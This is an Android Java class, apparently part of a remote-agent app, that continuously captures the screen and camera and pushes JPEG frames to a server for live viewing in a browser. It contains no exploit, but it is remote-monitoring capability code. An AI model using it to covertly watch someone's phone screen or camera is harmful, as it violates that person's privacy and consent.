package com.zeko.droid;

import android.content.Context;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.Collections;

/**
 * Stream realtime: screen (MediaProjection) và camera (Camera2 + YUV->JPEG).
 *
 * Khác bản cũ (mỗi frame gọi 1 lệnh → mở/đóng camera, ~1 fps):
 *  - giữ CameraDevice + CaptureSession + repeating request mở liên tục
 *  - đọc YUV_420_888, tự dựng NV21 rồi nén JPEG (nhanh, không cần lib)
 *  - screen hạ resolution VirtualDisplay + bỏ frame trùng (so hash mẫu)
 *  - agent PUSH frame lên server, server đẩy xuống browser → không round-trip mỗi frame
 */
public final class Streamer {

    public interface Sink { void frame(String kind, byte[] jpeg); }

    private static volatile boolean screenRunning, camRunning;
    private static Thread screenThread, camThread;

    private static int screenFps = 8, screenQ = 55;
    private static int camFps = 12, camQ = 60;
    private static final int SCREEN_MAX_W = 960;

    public static boolean screenActive() { return screenRunning; }
    public static boolean camActive() { return camRunning; }

    // ─────────────────────────── screen ───────────────────────────
    public static synchronized String startScreen(Context ctx, int fps, int quality, Sink sink) {
        if (screenRunning) return "da chay";
        MediaProjection mp = Media.projection;
        if (mp == null) return "chua co quyen MediaProjection";

        screenFps = Math.max(1, Math.min(20, fps));
        screenQ = Math.max(20, Math.min(90, quality));

        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics dm = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(dm);
        int dw = dm.widthPixels, dh = dm.heightPixels;

        float scale = dw > SCREEN_MAX_W ? SCREEN_MAX_W / (float) dw : 1f;
        final int w = Math.max(2, (int) (dw * scale));
        final int h = Math.max(2, (int) (dh * scale));
        final int dpi = (int) (dm.densityDpi * scale);

        final ImageReader reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
        VirtualDisplay vd;
        try {
            vd = mp.createVirtualDisplay("zk-stream", w, h, dpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    reader.getSurface(), null, null);
        } catch (Throwable t) {
            try { reader.close(); } catch (Throwable ignored) { }
            return "tao VirtualDisplay loi: " + t.getMessage();
        }

        screenRunning = true;
        final long interval = 1000L / screenFps;
        final Rect rect = new Rect(0, 0, w, h);

        screenThread = new Thread(() -> {
            int lastHash = 0;
            long lastSent = 0;
            while (screenRunning) {
                Image img = null;
                try {
                    img = reader.acquireLatestImage();
                    if (img == null) { Thread.sleep(10); continue; }
                    long now = System.currentTimeMillis();
                    if (now - lastSent < interval) { img.close(); img = null; Thread.sleep(5); continue; }

                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    int rowStride = img.getPlanes()[0].getRowStride();
                    int pixelStride = img.getPlanes()[0].getPixelStride();
                    int rowPadding = rowStride - pixelStride * w;

                    android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(
                            w + rowPadding / pixelStride, h, android.graphics.Bitmap.Config.ARGB_8888);
                    bmp.copyPixelsFromBuffer(buf);
                    android.graphics.Bitmap out = rowPadding == 0 ? bmp
                            : android.graphics.Bitmap.createBitmap(bmp, 0, 0, w, h);

                    // bỏ frame gần như không đổi (đỡ băng thông) nhưng tối đa 1s vẫn gửi 1 lần
                    int hash = sampleHash(out);
                    if (hash == lastHash && now - lastSent < 1000) {
                        if (out != bmp) out.recycle();
                        bmp.recycle();
                        continue;
                    }

                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    out.compress(android.graphics.Bitmap.CompressFormat.JPEG, screenQ, bos);
                    if (out != bmp) out.recycle();
                    bmp.recycle();
                    lastHash = hash;
                    lastSent = now;
                    sink.frame("screen", bos.toByteArray());
                } catch (Throwable ignored) {
                } finally {
                    if (img != null) try { img.close(); } catch (Throwable ignored) { }
                }
            }
            try { reader.close(); } catch (Throwable ignored) { }
        }, "zk-screen");
        screenThread.setDaemon(true);
        screenThread.start();
        return "ok";
    }

    public static synchronized void stopScreen() {
        screenRunning = false;
        try { if (screenThread != null) screenThread.join(1200); } catch (Throwable ignored) { }
        screenThread = null;
    }

    private static int sampleHash(android.graphics.Bitmap bmp) {
        try {
            int w = bmp.getWidth(), h = bmp.getHeight();
            int hash = 17;
            int stepX = Math.max(1, w / 24), stepY = Math.max(1, h / 16);
            for (int y = 0; y < h; y += stepY)
                for (int x = 0; x < w; x += stepX)
                    hash = hash * 31 + bmp.getPixel(x, y);
            return hash;
        } catch (Throwable t) { return 0; }
    }

    // ─────────────────────────── camera ───────────────────────────
    private static CameraDevice camDevice;
    private static CameraCaptureSession camSession;
    private static ImageReader camReader;
    private static HandlerThread camThreadHt;

    public static synchronized String startCam(Context ctx, int fps, int quality, int facing, Sink sink) {
        if (camRunning) return "da chay";
        camFps = Math.max(1, Math.min(30, fps));
        camQ = Math.max(20, Math.min(90, quality));
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String id = pickCamera(cm, facing);
            if (id == null) return "khong co camera";

            android.util.Size size = pickYuvSize(cm, id);
            camThreadHt = new HandlerThread("zk-cam2");
            camThreadHt.start();
            Handler handler = new Handler(camThreadHt.getLooper());

            camReader = ImageReader.newInstance(size.getWidth(), size.getHeight(),
                    ImageFormat.YUV_420_888, 3);

            final String camId = id;
            final java.util.concurrent.CountDownLatch opened = new java.util.concurrent.CountDownLatch(1);
            cm.openCamera(camId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice d) {
                    camDevice = d;
                    try {
                        d.createCaptureSession(Collections.singletonList(camReader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(CameraCaptureSession s) {
                                        camSession = s;
                                        try {
                                            CaptureRequest.Builder b = d.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                            b.addTarget(camReader.getSurface());
                                            b.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                                            b.set(CaptureRequest.CONTROL_AF_MODE,
                                                    CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                            s.setRepeatingRequest(b.build(), null, handler);
                                        } catch (Throwable ignored) { }
                                        opened.countDown();
                                    }
                                    @Override public void onConfigureFailed(CameraCaptureSession s) { opened.countDown(); }
                                }, handler);
                    } catch (Throwable t) { opened.countDown(); }
                }
                @Override public void onDisconnected(CameraDevice d) { opened.countDown(); }
                @Override public void onError(CameraDevice d, int e) { opened.countDown(); }
            }, handler);

            opened.await(6, java.util.concurrent.TimeUnit.SECONDS);
            if (camSession == null) {
                stopCam();
                return "khong mo duoc camera (quyen hoac dang bi app khac chiem)";
            }

            camRunning = true;
            final long interval = 1000L / camFps;
            final int vw = size.getWidth(), vh = size.getHeight();
            final Rect rect = new Rect(0, 0, vw, vh);

            camThread = new Thread(() -> {
                long lastSent = 0;
                while (camRunning) {
                    Image img = null;
                    try {
                        img = camReader.acquireLatestImage();
                        if (img == null) { Thread.sleep(8); continue; }
                        long now = System.currentTimeMillis();
                        if (now - lastSent < interval) { img.close(); img = null; Thread.sleep(4); continue; }

                        byte[] nv21 = yuv420ToNv21(img, vw, vh);
                        ByteArrayOutputStream bos = new ByteArrayOutputStream();
                        YuvImage yuv = new YuvImage(nv21, ImageFormat.NV21, vw, vh, null);
                        yuv.compressToJpeg(rect, camQ, bos);
                        lastSent = now;
                        sink.frame("cam", bos.toByteArray());
                    } catch (Throwable ignored) {
                    } finally {
                        if (img != null) try { img.close(); } catch (Throwable ignored) { }
                    }
                }
            }, "zk-cam");
            camThread.setDaemon(true);
            camThread.start();
            return "ok";
        } catch (Throwable t) {
            stopCam();
            return "loi: " + t.getMessage();
        }
    }

    public static synchronized void stopCam() {
        camRunning = false;
        try { if (camThread != null) camThread.join(1200); } catch (Throwable ignored) { }
        camThread = null;
        try { if (camSession != null) camSession.close(); } catch (Throwable ignored) { }
        camSession = null;
        try { if (camDevice != null) camDevice.close(); } catch (Throwable ignored) { }
        camDevice = null;
        try { if (camReader != null) camReader.close(); } catch (Throwable ignored) { }
        camReader = null;
        try { if (camThreadHt != null) camThreadHt.quitSafely(); } catch (Throwable ignored) { }
        camThreadHt = null;
    }

    /** YUV_420_888 (có thể có rowStride/pixelStride lệch) → NV21. */
    private static byte[] yuv420ToNv21(Image image, int width, int height) {
        byte[] nv21 = new byte[width * height * 3 / 2];
        Image.Plane[] planes = image.getPlanes();
        fillPlane(planes[0], nv21, width, height, 1, 0);
        fillPlane(planes[2], nv21, width / 2, height / 2, 2, width * height);      // V
        fillPlane(planes[1], nv21, width / 2, height / 2, 2, width * height + 1);  // U
        return nv21;
    }

    private static void fillPlane(Image.Plane plane, byte[] out, int w, int h, int step, int offset) {
        ByteBuffer buf = plane.getBuffer();
        int rowStride = plane.getRowStride();
        int pixelStride = plane.getPixelStride();
        byte[] row = new byte[rowStride];
        int pos = offset;
        for (int y = 0; y < h; y++) {
            buf.position(Math.min(y * rowStride, buf.capacity()));
            int len = Math.min(rowStride, buf.remaining());
            buf.get(row, 0, len);
            int count = Math.min(w, len / pixelStride);
            for (int x = 0; x < count; x++) {
                if (pos + step > out.length) return;
                out[pos] = row[x * pixelStride];
                pos += step;
            }
            if (pos >= out.length) return;
        }
    }

    private static String pickCamera(CameraManager cm, int facing) throws Exception {
        String fallback = null;
        for (String id : cm.getCameraIdList()) {
            CameraCharacteristics ch = cm.getCameraCharacteristics(id);
            Integer f = ch.get(CameraCharacteristics.LENS_FACING);
            if (fallback == null) fallback = id;
            if (f != null && f == facing) return id;
        }
        return fallback;
    }

    private static android.util.Size pickYuvSize(CameraManager cm, String id) throws Exception {
        CameraCharacteristics ch = cm.getCameraCharacteristics(id);
        android.hardware.camera2.params.StreamConfigurationMap map =
                ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
        android.util.Size[] sizes = map == null ? null : map.getOutputSizes(ImageFormat.YUV_420_888);
        if (sizes == null || sizes.length == 0) return new android.util.Size(640, 480);
        android.util.Size best = null;
        for (android.util.Size s : sizes) {
            long area = (long) s.getWidth() * s.getHeight();
            if (area <= 1280L * 720 && (best == null || area > (long) best.getWidth() * best.getHeight()))
                best = s;
        }
        if (best != null) return best;
        Arrays.sort(sizes, (a, b) -> Long.compare((long) a.getWidth() * a.getHeight(),
                (long) b.getWidth() * b.getHeight()));
        return sizes[0];
    }
}
